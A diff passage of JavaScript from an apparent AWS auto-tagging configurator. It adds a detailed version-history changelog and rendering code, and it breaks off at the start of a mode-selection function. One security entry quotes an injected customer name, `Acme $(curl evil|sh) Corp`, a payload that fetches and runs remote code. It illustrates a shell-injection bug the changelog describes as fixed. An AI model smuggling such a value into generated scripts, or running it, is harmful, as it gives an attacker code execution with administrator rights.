@@ -1,0 +1,9380 @@
+        // Template version — single source of truth for the SemVer constant.
+        // Must match `TEMPLATE_VERSION = 'v21.0.7'` in map2-auto-tagger-optimized.yaml (sync-check enforces this).
+        const TEMPLATE_VERSION = 'v21.0.7';
+
+        // Version history surfaced in the Update flow. Bullets are intentionally English-only —
+        // translating release notes across 7 languages for every PR is unsustainable. Labels
+        // (titles, buttons) go through i18n; change bullets stay in source form.
+        // Tags: bugfix, coverage, breaking, security, perf, other.
+        // sync-check.py enforces that the newest entry's version matches TEMPLATE_VERSION.
+        const VERSION_HISTORY = [
+            {
+                version: 'v21.0.7',
+                date: '2026-05-01',
+                changes: [
+                    { tag: 'bugfix', text: 'Remove explicit PreflightLogGroup CFN resource to prevent AlreadyExists error on StackSet cross-region redeploy. CloudWatch auto-creates the log group; eliminates the orphan race where the Custom Resource Delete handler writes logs after CFN deletes the explicit log group.' },
+                    { tag: 'bugfix', text: 'Fix VPC-scope reconciliation scope leak and is_in_scope over-tagging. When vpc_id is unresolvable and tag_non_vpc_services is true, VPC-bound services (ec2, rds, elasticache, etc.) now return False instead of falling through. Prevents reconciliation from converting VPC scope into account scope on the nightly sweep.' },
+                ],
+            },
+            {
+                version: 'v21.0.6',
+                date: '2026-04-29',
+                changes: [
+                    { tag: 'bugfix', text: 'AgreementEndDate enforcement — is_after_agreement() and reconciliation _in_agreement() now check both start AND end dates. Resources created after agreement end are no longer tagged (CT2 F036 / CT3 A3). YAML template adds AgreementEndDate parameter with Default 2099-12-31 for backwards compatibility.' },
+                ],
+            },
+            {
+                version: 'v21.0.4',
+                date: '2026-04-28',
+                changes: [
+                    { tag: 'bugfix', text: 'Configurator validation: agreement dates now validated as real calendar dates (F034). MPE ID length check added — 1-44 chars (F031). update.sh detects single-account stacks and provides SSM instructions (F026). update.sh scope edit validated for JSON correctness (F017). deploy.sh warns before updating existing stacks (F041).' },
+                ],
+            },
+            {
+                version: 'v21.0.3',
+                date: '2026-04-28',
+                changes: [
+                    { tag: 'bugfix', text: 'Peer detector now matches StackSet-deployed stacks (StackSet-map-auto-tagger-mig* prefix) in addition to direct stacks (F018). UPDATE_ROLLBACK_FAILED classified as permanent_ignorable instead of transient (F029). Control Tower managed rule tag attempts classified as permanent_ignorable (F030).' },
+                ],
+            },
+            {
+                version: 'v21.0.2',
+                date: '2026-04-28',
+                changes: [
+                    { tag: 'bugfix', text: 'Shell script fixes: add_subscriber.sh SNS topic name corrected to auto-map-tagger-alerts (F010) + region precedence fixed (F044). delete.sh MPE regex relaxed to accept any-length alphanumeric (F024). deploy.sh bucket creation now checks region and fails if bucket exists in wrong region instead of silently failing (F043).' },
+                ],
+            },
+            {
+                version: 'v21.0.1',
+                date: '2026-04-28',
+                changes: [
+                    { tag: 'bugfix', text: 'Multi-account deploy path unblocked: fixed scopedAccountIdsJson undefined in generateOrgTemplate (F007), RetainStacksOnAccountRemoval when AutoDeployment=false (F015), delete.sh now detects SERVICE_MANAGED StackSets and uses OrganizationalUnitIds instead of --accounts (F019).' },
+                ],
+            },
+            {
+                version: 'v21.0.0',
+                date: '2026-04-28',
+                changes: [
+                    { tag: 'breaking', text: 'MAJOR: Configurator Lambda fully synced with YAML Lambda — 147 handlers (was 26). Customers must regenerate deploy.sh from the configurator for this to take effect. Closes F012 (configurator Lambda sync gap), F005 (template drift), F025 (36 silent-loss pairs), F027 (VPC scope fallthrough).' },
+                    { tag: 'other', text: 'sync-check.py now enforces handler-count parity between YAML and configurator — prevents future F012-class regressions.' },
+                ],
+            },
+            {
+                version: 'v20.10.0',
+                date: '2026-04-28',
+                changes: [
+                    { tag: 'feature', text: 'YAML Lambda now includes native tag dispatch for DSQL, VPC Lattice, Bedrock AgentCore, Payment Cryptography, and Network Manager — previously only in the configurator Lambda. Closes the back-port gap that blocked F012 (configurator Lambda sync).' },
+                    { tag: 'bugfix', text: 'AD Connector (ConnectDirectory) now tagged. Added ConnectDirectory to the Directory Service handler and added "Connect" prefix to the EventBridge event pattern. Closes F006 (silent credit loss for AD Connector resources).' },
+                ],
+            },
+            {
+                version: 'v20.9.5',
+                date: '2026-04-27',
+                changes: [
+                    { tag: 'perf', text: 'Native-API tag dispatch (S3, QuickSight, CloudFront, Route53, Kinesis, Firehose, APIGateway, AutoScaling, SQS, MemoryDB, DAX, StorageGateway, IoT, Keyspaces, CloudHSM v2, Directory Service, Bedrock Agent, Global Accelerator, KinesisVideo) now shares the 4-attempt exponential-backoff throttle retry (1s → 2s → 4s → 8s, ±25% jitter) previously only wired on the RGTA fallthrough. Short throttles are absorbed in-invocation instead of burning one of the 5 SQS redeliveries (180s VT each). THROTTLE_CODES is hoisted so both code paths share the same constant. (§1.81/§1.92)' },
+                    { tag: 'security', text: 'Configurator review tables (editor/update/delete/deploy) now render customer-supplied values via textContent + document.createElement instead of innerHTML template literals. Closes the self-XSS surface where a customer-typed name, email, or VPC ID that somehow bypasses the input regex could inject an HTML/JS payload into the review pane. (§1.94)' },
+                ],
+            },
+            {
+                version: 'v20.9.4',
+                date: '2026-04-27',
+                changes: [
+                    { tag: 'bugfix', text: 'CloudHSM v2 handler now matches the real CloudTrail eventSource `cloudhsm.amazonaws.com` (not `cloudhsmv2.amazonaws.com`). Clusters and HSMs created via the CloudHSM v2 API were never tagged before — live-confirmed 2026-04-27 on 586009411781. The boto3 client name is still `cloudhsmv2`; only the CloudTrail eventSource differs. (§1.99b)' },
+                    { tag: 'bugfix', text: 'NAT Gateway ARN extraction now unwraps `CreateNatGatewayResponse` the same way the other EC2 handlers (NetworkAcl, LaunchTemplate, TransitGateway, VpnGateway, RouteTable) do. Prior handler tried top-level keys only and missed the wrapped shape. (§1.50)' },
+                    { tag: 'bugfix', text: 'Added `batch:TagResource` to the Lambda IAM policy. AWS Batch job queues, compute environments, and job definitions were silently AccessDenied by RGTA dispatch — the service-authorization matrix requires the per-service action. (§1.27)' },
+                    { tag: 'bugfix', text: 'Classifier now treats ElastiCache "is either not present or not available" (provisioning race) and SSM "concurrently modified" (ConcurrentUpdateException during parallel PutParameter bursts) as TRANSIENT. Prior behavior routed both to permanent_actionable → false SNS alerts on retry-eligible failures. (§1.101, §1.44)' },
+                    { tag: 'coverage', text: 'Removed the false CloudFormation claim from docs/COVERAGE.md. CloudFormation is NOT on the MAP Included Services List (6 April 2026 edition); stack resources do not earn MAP credit. The IAM actions `cloudformation:TagResource / UpdateStack / UpdateStackSet / ListStacks` stay — they are used for internal CFN TagResource routing and peer-tagger detection, not for customer-visible CFN tagging. (§1.100)' },
+                ],
+            },
+            {
+                version: 'v20.9.3',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'other', text: 'New CloudWatch alarm TrickleFailureAlarm catches slow-rate permanent_actionable tagging failures that the existing per-minute TaggerErrorAlarm misses. Fires when ≥6 of the last 24 hourly buckets each contain ≥1 TagFailureByClass{ErrorClass=permanent_actionable} datapoint — catches a trickle (e.g. one failure/hour for 6+ hours indicating IAM drift or a new resource type the classifier does not handle) while ignoring one-off transients.' },
+                    { tag: 'bugfix', text: 'RunInstances volume resolution now fails fast on InvalidInstanceID.Malformed instead of burning the 30s describe_instances retry budget. The error propagates through _process_event, the classifier routes it to permanent_actionable, and an SNS alert fires — malformed instance IDs never resolve on retry and should not silently eat the whole Lambda budget. InvalidInstanceID.NotFound is unchanged (stays in PERMANENT_IGNORABLE_MARKERS — instance may still be materializing).' },
+                    { tag: 'other', text: 'Removed dead duplicate Glue CreateTable branch in extract_arn — the first occurrence (above the resources-array scan) already returned the table ARN, so the later elif was unreachable dead code.' },
+                ],
+            },
+            {
+                version: 'v20.9.2',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'bugfix', text: 'get_config() now wraps ssm.get_parameter and JSON parse in try/except. On SSM failure it logs CONFIG_UNREACHABLE and returns a safe-default config with mpe_id=None; is_in_scope() hard-rejects that state, so nothing tags until the next TTL refresh succeeds. Prior behavior let one transient SSM hiccup DLQ an entire burst.' },
+                    { tag: 'bugfix', text: 'Whitespace stripped from every element of scoped_account_ids and scoped_vpc_ids at config parse time; empty elements dropped. CFN CommaDelimitedList strips on deploy, but SSM-stored config may carry customer-edit whitespace.' },
+                    { tag: 'bugfix', text: 'is_in_scope() now fails closed at the scope-decision entry point: if config.mpe_id is falsy, return False (§1.3 defense-in-depth).' },
+                    { tag: 'bugfix', text: 'is_in_scope() cross-checks agreement_start_date via datetime.strptime and logs CONFIG_INVALID_AGREEMENT_DATE on failure (§1.129 class: 2026-02-31 passes the CFN regex but fails strptime).' },
+                    { tag: 'security', text: 'MpeId CFN parameter now has MaxLength: 20. The ^mig[a-zA-Z0-9]+$ pattern had no length cap; real MPE IDs are mig + 10–13 chars, so 20 is well above real usage and prevents an absurdly long ID from leaking into log group names or SSM parameter paths.' },
+                ],
+            },
+            {
+                version: 'v20.9.1',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'bugfix', text: 'Expanded TRANSIENT_MARKERS so the three-path classifier retries S3 OperationAborted (409 conflicting conditional operation — concurrent CreateBucket/PutBucketTagging), EC2 SnapshotCreationPerVolumeRateExceeded (per-volume snapshot rate ceiling hit by burst backup/DR workloads), and the Throttling.User variant (EC2/STS emit this distinct from plain Throttling). Prior behavior routed all three to permanent_actionable → false SNS alerts during normal burst conditions that resolve on SQS redelivery.' },
+                    { tag: 'bugfix', text: 'Bedrock system-defined inference profiles added to PERMANENT_IGNORABLE_MARKERS. CreateInferenceProfile fires for both application profiles (taggable — tag normally) and system-defined profiles (tag API returns "System-defined Inference Profile is not taggable"). Silently ack the system ones via CW metric while continuing to tag application profiles from the same event — CreateInferenceProfile is NOT added to IGNORE_EVENTS, which would skip both.' },
+                ],
+            },
+            {
+                version: 'v20.9.0',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'bugfix', text: 'CFN Custom Resource preflight blocks peer-tagger scope collisions at stack-instance creation time. The configurator\'s deploy.sh preflight catches conflicts for deploys that run deploy.sh, but StackSet AutoDeployment into a newly-joined OU account provisions the stack instance directly — deploy.sh never runs, so a peer tagger in that account was previously only surfaced via the runtime PeerTaggerDetectedAlarm (PR #60), after the collision had already started. New PreflightFunction + Custom::PeerTaggerPreflight resource run before AutoTaggerFunction is created; on detected overlap they FAIL the Custom Resource → CFN rolls back the stack instance → no tagger is ever provisioned in the contaminated account. Fail-open on any internal error (throttle / IAM propagation / region issue) so legitimate deploys are never blocked by transient AWS conditions. Closes §1.108 temporal race.' },
+                    { tag: 'other', text: 'Customer-facing support contract codified in docs/LIMITATIONS.md: the supported deployment path is configurator.html → deploy.sh. Running aws cloudformation create-stack against the raw YAML directly skips all preflight checks and is unsupported; bugs reproducible only via direct-YAML usage will be closed with a request to reproduce through the configurator.' },
+                ],
+            },
+            {
+                version: 'v20.8.1',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'bugfix', text: 'Directory Service MS AD and Simple AD no longer generate false SNS alerts during directory provisioning. Directories stay in "Creating" state for 5–10 min (Simple AD) or 25–45 min (MS AD); tagging during that window returns "not supported for directories in this state. Directory Status: Creating", which the three-path classifier was routing to permanent_actionable → SNS alert on every AD creation. Added both phrases to TRANSIENT_MARKERS so Simple AD retries succeed within the 900s SQS budget; MS AD retries exhaust into EventDLQ without false alert noise, and the ReconciliationFunction catches the tag on the next nightly sweep (§1.98).' },
+                ],
+            },
+            {
+                version: 'v20.8.0',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'perf', text: 'Lambda SQS event source mapping BatchSize raised 1 → 10 + FunctionResponseTypes=[ReportBatchItemFailures]. Phase 16 measured per-Lambda drain rate at 1.3 msg/s; a 15K-resource burst produced a 2.8-hour backlog. With batching each invocation drains up to 10 messages and only failed records are redelivered — drain rate rises ~10× while retry semantics per record are preserved. Closes §1.123, §1.124, §1.125, §1.131.' },
+                    { tag: 'other', text: 'Runtime peer-tagger detection at Lambda cold-start. Lists map-auto-tagger-mig* stacks in this account/region and emits MapAutoTagger/PeerTaggerDetected + SNS alert via PeerTaggerDetectedAlarm when peers are found. Configurator\'s Class-2 preflight catches overlap at deploy.sh runtime, but StackSet AutoDeployment into new OU accounts bypasses deploy.sh entirely — Phase 16 Test 5 confirmed 0/50 resources got the intended MPE in that case. Detector doesn\'t prevent contamination (architectural routing fix is plan-PR #59); it surfaces it so customers find out from a CloudWatch alarm, not a MAP finance audit. Partial §1.108.' },
+                    { tag: 'other', text: 'New Layer 1 regression guard batchsize-floor ensures EventQueueMapping.BatchSize stays ≥ 10 and ReportBatchItemFailures remains set. Catches silent reverts that our 50-resource E2E can\'t stress.' },
+                ],
+            },
+            {
+                version: 'v20.7.3',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'bugfix', text: 'CloudWatch Dashboard PutDashboard ARN now has empty region (arn:aws:cloudwatch::ACCT:dashboard/NAME) per AWS IAM Service Authorization Reference. Prior handler emitted arn:aws:cloudwatch:REGION:… which RGTA rejected on every PutDashboard event (§1.83).' },
+                    { tag: 'coverage', text: 'New EnableSecurityHub handler: response is null, so construct arn:aws:securityhub:REGION:ACCT:hub/default directly. Hub is always named "default" per AWS docs (§1.84).' },
+                    { tag: 'coverage', text: 'New ActivateGateway handler for AWS Storage Gateway + native dispatch in tag_resource. GatewayARN field name caught by suffix-match in extract_arn (PR #43a), but RGTA does not support Storage Gateway — native storagegateway.add_tags_to_resource required (§1.85).' },
+                    { tag: 'bugfix', text: 'DAX native dispatch added to tag_resource. Response extraction already worked but RGTA does not support DAX — every CreateCluster event fell to RGTA and AccessDenied silently. Native dax.tag_resource(ResourceName=arn, …) dispatch (§1.84).' },
+                    { tag: 'bugfix', text: 'CreateHttpNamespace (Service Discovery) and PutQueryDefinition (CW Logs Insights) moved to IGNORE_EVENTS. CreateHttpNamespace returns only operationId (would need async polling that exceeds SQS 180s VT); PutQueryDefinition ARN shape is rejected by RGTA + native (not taggable per AWS). Prior dead handlers generated SNS noise. Closes §1.86, §1.87.' },
+                ],
+            },
+            {
+                version: 'v20.7.2',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'bugfix', text: 'Added vpc-lattice:TagResource to the Lambda IAM policy. COVERAGE.md claimed VPC Lattice was supported via RGTA fallthrough, but without the per-service TagResource grant every CreateServiceNetwork event AccessDenied\'d silently (D7).' },
+                    { tag: 'bugfix', text: 'CreateApiKey added to IGNORE_EVENTS (dead handler removed). API Gateway API Key ARN shape is rejected by all tagging APIs per MAP_TAGGING_GAP_ANALYSIS.md; prior handler constructed an ARN that RGTA + native both refuse — generated SNS alarm noise on every CreateApiKey event (D11).' },
+                    { tag: 'bugfix', text: 'Sync-check IAM-action regex now allows hyphens in the service prefix (vpc-lattice, resource-explorer-2, sms-voice). Prior regex [\\w]+:[\\w]+ silently skipped 11 hyphenated actions in the configurator TAGGING_PERMISSIONS list — bug in sync-check itself, not the catalog.' },
+                    { tag: 'other', text: 'Documentation cleanup (plan-PR #56 D7-D13): OVERVIEW.md Bedrock claim no longer lists AgentCore (ghost claim, no handler). OVERVIEW.md cost table adds SQS + SNS rows. CHANGELOG v20.3.0 gets a retraction note documenting the §1.98/§1.99 Tier 1 live bugs shipped at that version and fixed in v20.5.1/v20.6.4. INSTRUCTIONS.md upgrade section documents the dual-Lambda concurrent-tagging window when migrating from pre-v19.' },
+                ],
+            },
+            {
+                version: 'v20.7.1',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'bugfix', text: 'Handler case-sensitivity fixes via new ci_get() helper. CloudTrail emits camelCase field names for some older services (Kendra CreateIndex response: "id" not "Id", §1.97; Redshift CreateCluster: "clusterIdentifier" with variant casing, §1.91; Elastic Beanstalk CreateApplication nested at "application.applicationName" not "Application.ApplicationName", §1.103). Prior handlers assumed boto3 SDK PascalCase shape → silent miss. ci_get() does case-insensitive dict lookup with exact-match priority. Also applied to SageMaker CreateDomain/CreatePipeline/CreateFeatureGroup handlers (pre-existing hand-coded or-chains simplified). Only applied to responseElements/requestParameters reads; not to internal dict keys.' },
+                ],
+            },
+            {
+                version: 'v20.7.0',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'coverage', text: 'Added suffix-match fallback to extract_arn (both Lambda template and configurator inline). The hand-curated ARN_FIELDS allowlist was missing ~46 ARN key names across newer/less-common services (AppRunner ServiceArn, Batch jobQueueArn, ImageBuilder imagePipelineArn, Pinpoint PhoneNumberArn, etc.) — every miss was a silent credit loss. Fallback catches any responseElements key ending in Arn/ARN/arn whose value starts with "arn:" AND whose ARN service segment matches the event source (or a known alias like bedrock→bedrock-agent, kinesis→firehose). Allowlist remains Tier-1; fallback is additive, runs only when allowlist misses. Closes §1.31, §1.35, §1.56, §1.57, §1.61, §1.63, §1.65, §1.66, §1.67, §1.68 and ~35 other silent-miss service classes.' },
+                ],
+            },
+            {
+                version: 'v20.6.5',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'bugfix', text: 'MapConfig SSM parameter now uses Tier: Intelligent-Tiering instead of the default Standard tier. Customers with ~240+ accounts in scoped_account_ids generate a Value > 4KB (the Standard-tier limit); prior behavior silently failed stack create with ParameterMaxSizeExceeded. Intelligent-Tiering stays free for normal-sized deployments and auto-upgrades to Advanced ($0.05/parameter/month) only when the Value actually crosses the threshold. Closes §1.60.' },
+                ],
+            },
+            {
+                version: 'v20.6.4',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'bugfix', text: 'Added cassandra:Alter to the Lambda IAM policy. Keyspaces TagResource requires both cassandra:TagResource AND cassandra:Alter per the AWS IAM Service Authorization Reference — v20.3.0 shipped with only TagResource, causing AccessDenied on every Keyspaces tagging attempt (§1.99). Live-confirmed Tier 1 MAP service bug.' },
+                    { tag: 'other', text: 'New Layer 1 CI check "IAM Completeness (native-dispatch)": parses boto3.client()/get_service_client() calls from the Lambda source, derives required IAM actions from a hand-curated service-authorization map, and fails the build if the canonical tagging-permissions list is missing any. Prevents future §1.99-class bugs where a new native-dispatch handler ships without the matching IAM grant.' },
+                ],
+            },
+            {
+                version: 'v20.6.3',
+                date: '2026-04-26',
+                changes: [
+                    { tag: 'bugfix', text: 'Multi-account deploy.sh now defines REGIONS in its header. The preflight loop iterated over $REGIONS (plural) but only $REGION (singular) was ever set, so the stack-state preflight loop silently ran zero iterations in multi-account mode — customers could deploy on top of a stale *_IN_PROGRESS or ROLLBACK_COMPLETE stack without warning.' },
+                    { tag: 'bugfix', text: 'Multi-account deploy.sh DEPLOY_STATUS guard changed from [ -z "$DEPLOY_STATUS" ] to [ "$DEPLOY_STATUS" = "NOT STARTED" ]. The -z guard was always false because DEPLOY_STATUS is initialized non-empty at the top of the script, so the entire StackSet-instance wait block (1200s poll for per-account rollout) was unreachable dead code. On success, DEPLOY_STATUS stayed "NOT STARTED" and the backfill-wait block (which gates on == "SUCCESS") never ran.' },
+                    { tag: 'bugfix', text: 'PREFLIGHT_LOG printed via printf \'%b\' "$PREFLIGHT_LOG" instead of printf "$PREFLIGHT_LOG" — prevents % characters in AWS API output from being interpreted as printf format specifiers. %b preserves \\n → newline interpretation.' },
+                    { tag: 'bugfix', text: 'Backfill wait no longer polls a nonexistent EventBridge rule. Prior code gated the CloudWatch Logs poll on aws events describe-rule --name map-auto-tagger-backfill-$MPE returning DISABLED, but backfill is a Custom::Backfill CustomResource (one-shot during stack create), not an EventBridge rule. Every deploy with backfill enabled silently hit the 1200s timeout before any log poll ran; customers saw the "Backfill is still running" message even when backfill had completed in seconds.' },
+                ],
+            },
+            {
+                version: 'v20.6.2',
+                date: '2026-04-25',
+                changes: [
+                    { tag: 'bugfix', text: 'Backfill Lambda lookup_events retry now also matches the "ThrottledException" variant (with "ed"), not just "ThrottlingException" (with "ing"). CloudTrail normally throws the "ing" form but the "ed" variant has been observed in this path — same class as PR #17 fix for the main Lambda. Defensive symmetry across both variants.' },
+                    { tag: 'bugfix', text: 'Backfill CFN Custom Resource now reports the real outcome in the Reason field. Prior behavior: always "Backfill: N sent, 0 errors" even when half the ~140 event types silently failed CloudTrail lookup after 4-retry exhaustion. New Reason: "Backfill: {sent} sent, {send_errors} send errors, {lookup_errors}/{N} event types failed lookup" — visible in CloudFormation event history. Still reports SUCCESS so stack create does not block on transient CloudTrail throttles (live tagging is unaffected by backfill failure).' },
+                ],
+            },
+            {
+                version: 'v20.6.1',
+                date: '2026-04-25',
+                changes: [
+                    { tag: 'bugfix', text: 'Editor-mode update.sh generator: every aws CLI call now has explicit --region "$REGION". Customers running the script with AWS_DEFAULT_REGION unset or set to a different region no longer deploy into the wrong region or fail on cross-region StackSet lookup.' },
+                    { tag: 'bugfix', text: 'Editor-mode update.sh now reads the current template via describe-stack-set --query StackSet.TemplateBody instead of downloading the deprecated S3 staging copy (auto-map-tagger-<acct>/map-auto-tagger-accounts-<mpe>.yaml). The staging object was only created during the initial multi-account deploy and could be missing / stale / garbage-collected — this eliminates the S3 dependency entirely.' },
+                    { tag: 'bugfix', text: 'Upgrade-mode compare_versions now strict-validates three-part numeric SemVer (vMAJOR.MINOR.PATCH) and returns "error" on unparseable input instead of silently falling through to "patch". Prior behavior misclassified e.g. v21.0.6-rc1 → v20.3.0 as patch; upgrade_one caller now fails closed and directs the operator to --force.' },
+                ],
+            },
+            {
+                version: 'v20.6.0',
+                date: '2026-04-25',
+                changes: [
+                    { tag: 'other', text: 'New configurator mode: Delete existing deployment → generates delete.sh that auto-detects single-account Stacks and multi-account StackSets matching map-auto-tagger-mig*, deletes them, and conditionally removes the S3 staging bucket (kept if any other deployments remain in the account). Optional opt-in to also delete CloudWatch Log Groups. Preserves map-migrated tags on AWS resources (MAP credits remain intact) and StackSet admin/execution IAM roles (shared org scaffolding). Confirmation: type DELETE. MPE ID input mirrors Editor/Update — auto-uppercase and enforced 10-char [A–Z0–9] format with invalid-row highlighting. Full i18n parity across all 7 languages (labels, error messages, review table, and the downloadable instructions preview all re-render on language switch). Idempotent — safe to re-run.' },
+                ],
+            },
+            {
+                version: 'v20.5.4',
+                date: '2026-04-25',
+                changes: [
+                    { tag: 'other', text: 'Configurator Upgrade-mode generator now outputs upgrade.sh (was update.sh). The Editor-mode day-2 account-scope flow continues to output update.sh. The two scripts had the same filename; customers running both flows got colliding downloads with no way to tell which was which.' },
+                ],
+            },
+            {
+                version: 'v20.5.3',
+                date: '2026-04-25',
+                changes: [
+                    { tag: 'bugfix', text: 'Fix generated upgrade-flow script — previously used --use-previous-parameters, a flag that does not exist on AWS CLI v2 update-stack or update-stack-set. Every customer upgrade attempt failed with "Unknown options: --use-previous-parameters". Replaced with per-parameter UsePreviousValue=true list built dynamically from each stack\'s existing parameters so newly-added template parameters (e.g. ReconciliationInterval) pick up the new template\'s Default. (Upgrade-flow output was renamed to upgrade.sh in v20.5.4.)' },
+                ],
+            },
+            {
+                version: 'v20.5.2',
+                date: '2026-04-25',
+                changes: [
+                    { tag: 'security', text: 'Generated deploy.sh now contains customer-name input inside single-quoted shell strings (previously double-quoted). Fixes a supply-chain RCE where a partner-supplied customer name like `Acme $(curl evil|sh) Corp` would execute on the customer\'s CloudShell with AdministratorAccess. Re-download deploy.sh from the configurator before next deploy.' },
+                    { tag: 'other',    text: 'New Layer 1 CI check (Shell Injection Guard) fails the build if the generator reintroduces the unsafe shape.' },
+                ],
+            },
+            {
+                version: 'v20.5.1',
+                date: '2026-04-25',
+                changes: [
+                    { tag: 'bugfix',   text: 'Config SSM cache now has a 60-second TTL — warm containers no longer misattribute credit for up to 15 minutes after an MPE rotation.' },
+                    { tag: 'bugfix',   text: 'Added events:TagResource IAM permission. Previously EventBridge rules / buses / schedules / connections AccessDenied on tag (IoT Events\' iotevents:TagResource is a different service).' },
+                    { tag: 'bugfix',   text: 'CFN Output ConfigParameter now returns the real SSM parameter path (/auto-map-tagger/<mpe>/config) instead of the literal string /auto-map-tagger/config.' },
+                ],
+            },
+            {
+                version: 'v20.5.0',
+                date: '2026-04-24',
+                changes: [
+                    { tag: 'other',    text: 'Reconciliation Lambda — daily safety-net that enumerates in-scope resources via Resource Groups Tagging API and re-enqueues any whose map-migrated tag is missing or wrong-MPE, routed through the live Lambda\'s three-path classifier for the actual tag write.' },
+                    { tag: 'other',    text: 'New CloudWatch metrics in MapAutoTagger namespace: ReconciliationResourcesScanned, ReconciliationMissingTag, WrongMpeCorrected (dims ExpectedMpe + FoundMpe), ReconciliationTimeoutCanary (fires at 13 min elapsed).' },
+                    { tag: 'other',    text: 'New CFN parameter ReconciliationInterval (default rate(24 hours)) — customer can tighten catch-up cadence if desired.' },
+                ],
+            },
+            {
+                version: 'v20.4.0',
+                date: '2026-04-24',
+                changes: [
+                    { tag: 'bugfix',   text: 'Three-path error classifier: transient errors retry via SQS, permanent-ignorable (resource deleted between create and tag) silent-ack without alerting, permanent-actionable (tag quota, SCP drift, unknown) alert + route to EventDLQ. Reduces false-positive SNS noise and ensures actionable failures surface.' },
+                    { tag: 'other',    text: 'TagFailureByClass CloudWatch metric (namespace MapAutoTagger) dimensions ErrorClass + MpeId — triage which error class drove a given failure without parsing log messages.' },
+                    { tag: 'other',    text: 'Configurator now warns loudly (red banner) if Alert email is blank on deploy. Deploy still permitted — tagging failures just go un-alerted until a subscriber is added via scripts/add_subscriber.sh or the configurator update flow.' },
+                ],
+            },
+            {
+                version: 'v20.3.0',
+                date: '2026-04-22',
+                changes: [
+                    { tag: 'coverage', text: 'Added handlers for Amazon Keyspaces (CreateKeyspace), AWS Directory Service (CreateDirectory + CreateMicrosoftAD), and AWS CloudHSM v2 (CreateCluster + CreateHsm).' },
+                    { tag: 'coverage', text: 'Added IAM permissions: ds:AddTagsToResource and cloudhsm:TagResource.' },
+                    { tag: 'other',    text: 'AD Connector (ConnectDirectory) intentionally deferred — requires broader EventBridge prefix changes.' },
+                ],
+            },
+            {
+                version: 'v20.2.0',
+                date: '2026-04-22',
+                changes: [
+                    { tag: 'other',    text: 'AutoDeployment=True only when scope is ALL; False when scope is specific accounts — prevents new OU accounts auto-receiving Lambda when customer explicitly scoped.' },
+                    { tag: 'bugfix',   text: 'Cross-MPE conflict detection at deploy time (multi-account StackSet overlap + single-account same-account multi-Lambda with VPC precision).' },
+                ],
+            },
+            {
+                version: 'v20.1.0',
+                date: '2026-04-21',
+                changes: [
+                    { tag: 'other',    text: 'Version visibility: SSM parameter /auto-map-tagger/<mpe>/version, CFN Output TemplateVersion, and Lambda cold-start log line.' },
+                    { tag: 'other',    text: 'Batched IAM preflight: simulate-principal-policy over 21 deploy-time actions (26 for multi-account) in a single ~200ms call, catches explicitDeny + implicitDeny.' },
+                    { tag: 'bugfix',   text: 'Stack-state preflight: catches CREATE_IN_PROGRESS / ROLLBACK_COMPLETE / ROLLBACK_FAILED stuck states with specific remediation commands.' },
+                ],
+            },
+            {
+                version: 'v20.0.0',
+                date: '2026-04-18',
+                changes: [
+                    { tag: 'bugfix',   text: 'Recognize RGTA ThrottledException variant (with "ed") in addition to ThrottlingException — 8-account deploys no longer skip the SQS retry budget on RGTA throttles.' },
+                    { tag: 'perf',     text: 'Parallelize StackSet deploy/delete with OperationPreferences {Max=100%, Tolerance=100%, RegionConcurrency=PARALLEL} — hours → ~15–20 min for 8-account deployments.' },
+                    { tag: 'bugfix',   text: 'SSM parameter ARN missing "/" separator for flat parameter names — previously broke tagging for non-hierarchical parameter names.' },
+                    { tag: 'bugfix',   text: '4 latent bugs from proactive audit: Lambda Layers untaggable, Classic ELB routing, STS credential refresh, CreateSnapshot multi-service collision.' },
+                    { tag: 'coverage', text: 'WAFv2 (WebACL, IPSet) and CodeDeploy (Application, DeploymentGroup) handlers.' },
+                    { tag: 'other',    text: 'Resilient SQS pipeline: EventBridge → SQS (14-day retention) → Lambda with DLQ + SNS alarm.' },
+                ],
+            },
+        ];
+
+        function renderVersionHistory() {
+            const tagLabels = {
+                bugfix:   { label: t('ui_version_tag_bugfix'),   color: '#d13212' },
+                coverage: { label: t('ui_version_tag_coverage'), color: '#1d8102' },
+                breaking: { label: t('ui_version_tag_breaking'), color: '#ba1e04' },
+                security: { label: t('ui_version_tag_security'), color: '#9d1c2a' },
+                perf:     { label: t('ui_version_tag_perf'),     color: '#0073bb' },
+                other:    { label: t('ui_version_tag_other'),    color: '#687078' },
+            };
+            const entries = VERSION_HISTORY.map(v => {
+                const isCurrent = v.version === TEMPLATE_VERSION;
+                const header = `<div style="margin-top:14px;margin-bottom:4px;">
+                    <strong style="font-size:14px;color:#16191f;">${v.version}</strong>
+                    <span style="color:#687078;font-size:12px;"> — ${t('ui_version_released')} ${v.date}</span>
+                    ${isCurrent ? `<span style="margin-left:8px;padding:2px 6px;background:#e0f2e5;color:#1d8102;border-radius:3px;font-size:11px;font-weight:600;">${t('ui_version_current')}</span>` : ''}
+                </div>`;
+                const bullets = v.changes.map(c => {
+                    const tag = tagLabels[c.tag] || tagLabels.other;
+                    return `<li style="margin:4px 0;line-height:1.5;">
+                        <span style="display:inline-block;min-width:72px;padding:1px 6px;background:${tag.color}1a;color:${tag.color};border-radius:3px;font-size:10px;font-weight:600;text-transform:uppercase;margin-right:6px;vertical-align:middle;">${tag.label}</span>
+                        <span style="font-size:13px;color:#16191f;">${c.text}</span>
+                    </li>`;
+                }).join('');
+                return header + `<ul style="margin:0;padding-left:0;list-style:none;">${bullets}</ul>`;
+            }).join('');
+            const link = `<div style="margin-top:14px;padding-top:10px;border-top:1px solid #eaeded;font-size:12px;">
+                <a href="https://github.com/aws-samples/sample-auto-map-tagger/blob/main/CHANGELOG.md" target="_blank" rel="noopener" style="color:#0073bb;">${t('ui_version_full_changelog')} →</a>
+            </div>`;
+            return entries + link;
+        }
+
+        // --- Landing mode selection ---
+        function selectMode(mode) {
+            document.getElementById('landing').classList.toggle('hidden', mode !== null);
+            document.getElementById('deploy-flow').classList.toggle('hidden', mode !== 'deploy');
